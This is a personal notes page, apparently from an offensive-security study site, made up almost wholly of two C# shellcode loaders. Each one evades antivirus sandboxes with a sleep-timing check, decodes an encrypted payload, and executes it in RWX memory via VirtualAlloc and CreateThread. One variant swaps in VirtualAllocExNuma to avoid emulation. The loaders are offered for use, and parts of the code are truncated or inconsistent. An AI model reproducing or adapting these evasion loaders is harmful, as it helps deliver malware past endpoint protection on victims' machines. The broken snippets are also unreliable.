---
layout:     post
author:     0x5c4r3
type: docs
permalink: AV_Sandbox_Bypass
---


<span style="font-size: 35px; color:red"><b>Encrypted Exploit with Sandbox Bypass</b></span>
&nbsp;
Create shellcode from Helper.cs
```cs
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Runtime.InteropServices;


namespace ConsoleApp1
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

		[DllImport("kernel32.dll")]
		static extern void Sleep(uint dwMilliseconds);

        static void Main(string[] args)
        {

			DateTime t1 = DateTime.Now; //SLEEP FUNC TO CHECK SIMULATION (If skipped, it's an AV simulation, therefore stops execution to not being detected)
		    Sleep(2000);
		    double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
		    if(t2 < 1.5)
		    {
		        return;
		    }
		    
            byte[] buf = new byte[630] {0xfc,0x48,0x83,0xe4, //Change here with encrypted exploit from HELPER.CS
            
            for (int i = 0; i < buf.Length; i++) //DECRYPTING FUNCTION
            {
                buf[i] = (byte)(((uint)buf[i] - 2) & 0xFF);
            }
            
            int size = buf.Length;

            IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);

            Marshal.Copy(buf, 0, addr, size);

            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);

            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }
}
```
&nbsp;

---
&nbsp;
<span style="font-size: 25px; color:white"><b>Non-Emulated APIs</b></span>
<span style="color:red">Not Tested, but it should work fine.</span>
Another way of not being detected is to change famous Win32 APIs with less used ones (i.e. instead of VirtualAllocEx you casn use <span style="color:red">VirtualAllocExNuma</span>):

```cs
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Runtime.InteropServices;


namespace ConsoleApp1
{
    class Program
    {
		[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
		static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, 
		uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

		[DllImport("kernel32.dll")]
		static extern void Sleep(uint dwMilliseconds);
		
		[DllImport("kernel32.dll")]
		static extern IntPtr GetCurrentProcess();

        static void Main(string[] args)
        {

			IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
			if(mem == null)
			{
			    return;
			}
			
			DateTime t1 = DateTime.Now; //SLEEP FUNC TO CHECK SIMULATION (If skipped, it's an AV simulation, therefore stops execution to not being detected)
		    Sleep(2000);
		    double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
		    if(t2 < 1.5)
		    {
		        return;
		    }
		    
            byte[] buf = new byte[630] {0xfc,0x48,0x83,0xe4, //Change here with encrypted exploit from HELPER.CS
            
            for (int i = 0; i < buf.Length; i++) //DECRYPTING FUNCTION
            {
                buf[i] = (byte)(((uint)buf[i] - 2) & 0xFF);
            }
            
            int size = buf.Length;

            IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);

            Marshal.Copy(buf, 0, addr, size);

            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);

            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }
}
```
